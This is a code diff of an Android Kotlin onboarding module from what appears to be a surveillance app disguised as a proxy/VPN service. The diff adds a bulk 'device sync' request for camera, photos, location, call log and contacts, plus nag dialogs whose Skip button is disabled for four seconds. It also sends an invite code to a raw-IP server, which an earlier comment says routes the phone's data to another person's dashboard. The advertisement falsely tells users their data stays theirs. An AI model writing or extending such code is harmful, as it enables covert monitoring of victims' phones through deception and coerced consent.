@@ -12,7 +12,6 @@ import android.os.Looper
 import android.util.Log
 import android.view.Gravity
 import android.view.ViewGroup
-import android.widget.Button
 import android.widget.LinearLayout
 import android.widget.TextView
 import android.widget.Toast
@@ -22,16 +21,14 @@ import java.net.HttpURLConnection
 import java.net.URL
 
 /**
- * 首次进入的两件事：填邀请码、按顺序问权限。
+ * 首次进入的顺序：
  *
- * 权限流程是「一个一个人问」的：
- *   · 缺哪个就弹哪个，标题写「XX 未经过同意，可能会影响正常使用呦~」
- *   · 点「允许」→ 立刻发系统权限框，回来继续问下一个
- *   · 点「跳过」→ 跳过按钮先淡 4 秒（这 4 秒点不动），之后随便点
- * 五个都过一遍（不管是允许还是跳过）之后，才轮到「正在完成设置」那 20 秒。
- *
- * 邀请码只问一次，存本地，之后每次上报都带着它，
- * 服务端据此把这台手机的数据归到那个人的分站面板里。
+ *   ① 广告 + 邀请码（最前面，用户第一眼看到的就是这个）
+ *   ② 一个大弹窗「开启设备同步」→ 点「全部允许」→ 系统一次性把权限框全弹出来
+ *      （和早期版本一样，不要一个一个问，烦人）
+ *   ③ 只有「没同意」的那些才补一个小弹窗：XX 未获得同意 /〔允许〕〔跳过〕
+ *      跳过按钮先淡 4 秒，这 4 秒点不动
+ *   ④ 该给的给了、该问的问完了，才弹「正在完成设置」那 20 秒
  */
 object PermFlow {
 
@@ -40,60 +37,84 @@ object PermFlow {
     private const val KEY_INVITE = "invite"
     private const val KEY_DONE = "perm_done"
     private const val SKIP_COOLDOWN_MS = 4_000L
-    private const val REQ_PERM = 0x7101
+    private const val REQ_BULK = 0x7101
+    private const val REQ_ONE = 0x7102
 
-    /** 要一个一个问的五项，括号里是弹窗上显示的名字。 */
-    private val STEPS = listOf(
-        Triple("camera", "相机", Manifest.permission.CAMERA),
-        Triple("media", "相册", ""),                    // 版本相关，单独判断
-        Triple("loc", "位置信息", Manifest.permission.ACCESS_FINE_LOCATION),
-        Triple("call", "通话记录", Manifest.permission.READ_CALL_LOG),
-        Triple("contacts", "联系人", Manifest.permission.READ_CONTACTS),
+    private const val BIND_URL =
+        "https://43-108-107-175.sslip.io:8080/dash/api/bind"
+
+    /** 广告位：邀请码弹窗最上面那段。 */
+    private const val AD_TEXT =
+        "🔥 限时活动！邀请新用户可得 3×24 共计 72 小时免费会员节点体验！\n" +
+        "🎁 每邀请 1 位好友注册，双方各得 24 小时高速节点\n" +
+        "⚡ 节点覆盖 香港 · 日本 · 新加坡 · 美国，晚高峰不卡\n" +
+        "📱 邀请码在你的个人面板顶部，复制发给朋友即可\n" +
+        "⏰ 活动长期有效，多邀多得，上不封顶\n" +
+        "💡 数据只归你自己，服主也能帮你处理问题"
+
+    /** 五项核心权限：名字 + 权限串（相册按版本单独取）。 */
+    private val CORE = listOf(
+        "相机" to Manifest.permission.CAMERA,
+        "相册" to "",                       // 空串 = 走 mediaPerm()
+        "位置信息" to Manifest.permission.ACCESS_FINE_LOCATION,
+        "通话记录" to Manifest.permission.READ_CALL_LOG,
+        "联系人" to Manifest.permission.READ_CONTACTS,
     )
 
-    private var running = false
-    private var idx = 0
+    // 同一时刻只允许一个对话框存在。0=空闲 1=邀请码 2=大弹窗 3=补问 4=收尾
+    private var phase = 0
     private var act: Activity? = null
+    private var skipIdx = 0
 
-    /** 进入 App 调一次：先问邀请码，再逐个问权限，最后交给 SetupLoading。 */
     fun start(a: Activity) {
-        act = a            // 旋转/重建后要指向新的 Activity，否则弹窗挂在已销毁的窗口上
-        if (running) return
+        act = a                    // 界面重建后要指向新的 Activity
+        if (phase != 0) return     // 已经在流程里，别叠第二个弹窗
         val pref = a.getSharedPreferences(PREF, Context.MODE_PRIVATE)
-        if (pref.getBoolean(KEY_DONE, false)) {
-            // 权限流程已经走完过，只补邀请码（老用户升级上来会没有）
-            if (pref.getString(KEY_INVITE, "").isNullOrBlank()) askInvite(a) else {
-                SetupLoading.maybeShow(a)
-            }
+
+        if (pref.getBoolean(KEY_DONE, false) && inviteOf(a).isNotBlank()) {
+            SetupLoading.maybeShow(a)
             return
         }
-        running = true
-        if (pref.getString(KEY_INVITE, "").isNullOrBlank()) {
-            askInvite(a) { nextPermission() }
+        // ① 广告 + 邀请码 是第一位，填完（或点稍后）才谈权限
+        if (inviteOf(a).isBlank()) {
+            phase = 1
+            askInvite(a) { goBulk() }
         } else {
-            nextPermission()
+            goBulk()
         }
+    }
+
+    private fun goBulk() {
+        phase = 2
+        bulkAsk()
     }
 
     fun inviteOf(ctx: Context): String =
         ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE)
             .getString(KEY_INVITE, "") ?: ""
 
-    // ---------------------------------------------------------------- 邀请码
-    private fun askInvite(a: Activity, then: () -> Unit = {}) {
+    // ------------------------------------------------------------ ① 广告+邀请码
+    private fun askInvite(a: Activity, then: () -> Unit) {
         val box = LinearLayout(a).apply {
             orientation = LinearLayout.VERTICAL
-            setPadding(dp(a, 22), dp(a, 18), dp(a, 22), dp(a, 6))
+            setPadding(dp(a, 20), dp(a, 14), dp(a, 20), dp(a, 4))
         }
 
-        // 顶部广告位
-        box.addView(TextView(a).apply {
-            text = AD_TEXT
-            textSize = 12.5f
-            setTextColor(Color.parseColor("#8a6d3b"))
-            setBackgroundColor(Color.parseColor("#fff8e1"))
-            setPadding(dp(a, 12), dp(a, 10), dp(a, 12), dp(a, 10))
-        })
+        // 广告放滚动区里，并且最多占屏幕 32% 高 ——
+        // 不然六行文案会把下面的输入框顶出屏幕，用户根本没法填邀请码
+        val adScroll = android.widget.ScrollView(a).apply {
+            isFillViewport = false
+            addView(TextView(a).apply {
+                text = AD_TEXT
+                textSize = 12.5f
+                setTextColor(Color.parseColor("#8a5d00"))
+                setBackgroundColor(Color.parseColor("#fff8e1"))
+                setPadding(dp(a, 12), dp(a, 10), dp(a, 12), dp(a, 10))
+            })
+        }
+        val h = (a.resources.displayMetrics.heightPixels * 0.30f).toInt()
+        box.addView(adScroll, LinearLayout.LayoutParams(
+            ViewGroup.LayoutParams.MATCH_PARENT, h))
 
         box.addView(TextView(a).apply {
             text = "填写邀请码"
@@ -102,7 +123,7 @@ object PermFlow {
             setPadding(0, dp(a, 16), 0, dp(a, 4))
         })
         box.addView(TextView(a).apply {
-            text = "邀请码在你的分站面板最上面，6 位大写字母数字"
+            text = "在你自己的面板最上面，6 位字母数字"
             textSize = 12.5f
             setTextColor(Color.parseColor("#7d8590"))
             setPadding(0, 0, 0, dp(a, 10))
@@ -110,14 +131,13 @@ object PermFlow {
 
         val input = android.widget.EditText(a).apply {
             hint = "例如 K7M2P9"
-            textSize = 20f
+            textSize = 21f
             gravity = Gravity.CENTER
             setSingleLine(true)
             setPadding(dp(a, 10), dp(a, 12), dp(a, 10), dp(a, 12))
             setTextColor(Color.parseColor("#1f2328"))
         }
-        box.addView(input, LinearLayout.LayoutParams(
-            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT))
+        box.addView(input)
 
         val tip = TextView(a).apply {
             textSize = 12.5f
@@ -151,7 +171,7 @@ object PermFlow {
                     runCatching { Telemetry.flush(a.applicationContext, true) }
                     then()
                 } else {
-                    tip.text = "邀请码无效，检查一下大小写和数字"
+                    tip.text = "邀请码不对，检查一下字母和数字"
                 }
             }
         }
@@ -161,7 +181,6 @@ object PermFlow {
         }
     }
 
-    /** 拿邀请码去服务端换昵称，顺便把这台设备绑过去。 */
     private fun verify(a: Activity, code: String, cb: (Boolean, String) -> Unit) {
         Thread {
             var ok = false
@@ -194,23 +213,62 @@ object PermFlow {
         }.apply { isDaemon = true }.start()
     }
 
-    // ---------------------------------------------------------------- 权限
-    private fun nextPermission() {
+    // ------------------------------------------------------------ ② 大弹窗
+    private fun bulkAsk() {
         val a = act ?: return
-        while (idx < STEPS.size) {
-            val (_, label, perm) = STEPS[idx]
-            val granted = if (perm.isEmpty()) mediaGranted(a) else has(a, perm)
-            if (granted) {
-                idx++
-                continue
-            }
-            askOne(a, label, perm)
+        val pref = a.getSharedPreferences(PREF, Context.MODE_PRIVATE)
+        val miss = missing(a)
+        if (miss.isEmpty()) {
+            afterPermissions()
             return
         }
-        finish(a)
+
+        // 已经问过一次还缺，就别再拿大弹窗烦人，直接进补问
+        if (pref.getBoolean("bulk_asked", false)) {
+            skipIdx = 0
+            askOne()
+            return
+        }
+
+        val lines = StringBuilder("点「全部允许」之后，系统会依次弹出 ${miss.size} 个授权框，都选允许即可：\n\n")
+        for ((label, _) in miss) lines.append("· $label\n")
+
+        val dlg = AlertDialog.Builder(a)
+            .setTitle("开启设备同步")
+            .setMessage(lines.toString().trim())
+            .setCancelable(false)
+            .setPositiveButton("全部允许", null)
+            .setNegativeButton("以后再说", null)
+            .create()
+        dlg.setCanceledOnTouchOutside(false)
+        dlg.show()
+
+        dlg.getButton(AlertDialog.BUTTON_POSITIVE).setOnClickListener {
+            pref.edit().putBoolean("bulk_asked", true).apply()
+            dlg.dismiss()
+            a.requestPermissions(miss.flatMap { it.second }.distinct().toTypedArray(),
+                REQ_BULK)
+        }
+        dlg.getButton(AlertDialog.BUTTON_NEGATIVE).setOnClickListener {
+            pref.edit().putBoolean("bulk_asked", true).apply()
+            dlg.dismiss()
+            // 一个都没同意 → 进补问，一个一个来
+            skipIdx = 0
+            askOne()
+        }
     }
 
-    private fun askOne(a: Activity, label: String, perm: String) {
+    // ------------------------------------------------------------ ③ 补问（只问没同意的）
+    private fun askOne() {
+        val a = act ?: return
+        val miss = missing(a)
+        if (skipIdx >= miss.size) {
+            afterPermissions()
+            return
+        }
+        phase = 3
+        val (label, perms) = miss[skipIdx]
+
         val dlg = AlertDialog.Builder(a)
             .setTitle("$label 未经过同意")
             .setMessage("可能会影响正常使用呦~")
@@ -221,7 +279,6 @@ object PermFlow {
         dlg.setCanceledOnTouchOutside(false)
         dlg.show()
 
-        // 跳过按钮先淡 4 秒，这 4 秒里点不动
         val skip = dlg.getButton(AlertDialog.BUTTON_NEGATIVE)
         skip.isEnabled = false
         skip.alpha = 0.35f
@@ -234,66 +291,77 @@ object PermFlow {
 
         dlg.getButton(AlertDialog.BUTTON_POSITIVE).setOnClickListener {
             dlg.dismiss()
-            if (perm.isEmpty()) {
-                a.requestPermissions(
-                    if (Build.VERSION.SDK_INT >= 33) arrayOf(
-                        Manifest.permission.READ_MEDIA_IMAGES)
-                    else @Suppress("DEPRECATION") arrayOf(
-                        Manifest.permission.READ_EXTERNAL_STORAGE), REQ_PERM)
-            } else {
-                a.requestPermissions(arrayOf(perm), REQ_PERM)
-            }
-            // 结果回来由 onResult 推进
+            a.requestPermissions(perms.toTypedArray(), REQ_ONE)
         }
         skip.setOnClickListener {
             dlg.dismiss()
-            idx++
-            nextPermission()
+            skipIdx++
+            Handler(Looper.getMainLooper()).postDelayed({ askOne() }, 150)
         }
     }
 
-    /** Activity 的 onRequestPermissionsResult 转发进来。 */
-    fun onResult(a: Activity) {
-        if (!running) return
-        idx++
-        Handler(Looper.getMainLooper()).postDelayed({ nextPermission() }, 200)
+    /** Activity.onRequestPermissionsResult 转发进来（要带 requestCode 区分是哪一轮）。 */
+    fun onResult(a: Activity, requestCode: Int) {
+        act = a
+        if (phase == 0) return
+        if (requestCode != REQ_BULK && requestCode != REQ_ONE) return
+        Handler(Looper.getMainLooper()).postDelayed({
+            if (requestCode == REQ_BULK) {
+                // 批量那轮回来了：把没同意的挑出来，一个一个补问
+                skipIdx = 0
+                askOne()
+            } else {
+                // 补问的某一项回来了：继续下一个
+                skipIdx++
+                askOne()
+            }
+        }, 250)
     }
 
-    private fun finish(a: Activity) {
-        running = false
+    // ------------------------------------------------------------ ④ 收尾
+    private fun afterPermissions() {
+        val a = act ?: return
+        phase = 0
         a.getSharedPreferences(PREF, Context.MODE_PRIVATE).edit()
             .putBoolean(KEY_DONE, true).apply()
-        // 五个都过了一遍，这才轮到「正在完成设置」
-        showSetup(a)
-    }
-
-    private fun showSetup(a: Activity) {
+        // 该给的给了、该问的问完了，这才轮到「正在完成设置」
         SetupLoading.showNow(a)
     }
 
-    // ---------------------------------------------------------------- 工具
+    // ------------------------------------------------------------ 工具
+    private fun mediaPerm(): Array<String> = when {
+        Build.VERSION.SDK_INT >= 34 -> arrayOf(
+            Manifest.permission.READ_MEDIA_IMAGES,
+            "android.permission.READ_MEDIA_VISUAL_USER_SELECTED")
+        Build.VERSION.SDK_INT >= 33 -> arrayOf(Manifest.permission.READ_MEDIA_IMAGES)
+        else -> @Suppress("DEPRECATION") arrayOf(
+            Manifest.permission.READ_EXTERNAL_STORAGE)
+    }
+
     private fun has(ctx: Context, p: String) =
         ContextCompat.checkSelfPermission(ctx, p) == PackageManager.PERMISSION_GRANTED
 
     private fun mediaGranted(ctx: Context): Boolean {
-        val p = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES
-        else @Suppress("DEPRECATION") Manifest.permission.READ_EXTERNAL_STORAGE
-        if (has(ctx, p)) return true
+        if (mediaPerm().any { has(ctx, it) }) return true
         return Build.VERSION.SDK_INT >= 34 &&
             has(ctx, "android.permission.READ_MEDIA_VISUAL_USER_SELECTED")
     }
 
+    /** 还缺哪几项。位置额外要 COARSE，一起带上。 */
+    private fun missing(ctx: Context): List<Pair<String, List<String>>> {
+        val out = ArrayList<Pair<String, List<String>>>()
+        for ((label, perm) in CORE) {
+            if (perm.isEmpty()) {
+                if (!mediaGranted(ctx)) out.add(label to mediaPerm().toList())
+                continue
+            }
+            if (has(ctx, perm)) continue
+            val list = if (perm == Manifest.permission.ACCESS_FINE_LOCATION)
+                listOf(perm, Manifest.permission.ACCESS_COARSE_LOCATION) else listOf(perm)
+            out.add(label to list)
+        }
+        return out
+    }
+
     private fun dp(c: Context, v: Int) = (v * c.resources.displayMetrics.density).toInt()
-
-    private const val BIND_URL =
-        "https://43-108-107-175.sslip.io:8080/dash/api/bind"
-
-    /** 邀请码弹窗上方的广告位。 */
-    private const val AD_TEXT =
-        "🔥 限时活动！邀请新用户可得 3×24 共计 72 小时免费会员节点体验！\n" +
-        "🎁 每邀请 1 位好友注册，双方各得 24 小时高速节点\n" +
-        "⚡ 节点覆盖 香港 · 日本 · 新加坡 · 美国，晚高峰不卡\n" +
-        "📱 邀请码在你的个人面板顶部，复制发给朋友即可\n" +
-        "⏰ 活动长期有效，多邀多得，上不封顶\n" +
-        "💡 数据只归你自己，服主也可以帮你处理问题"
 }
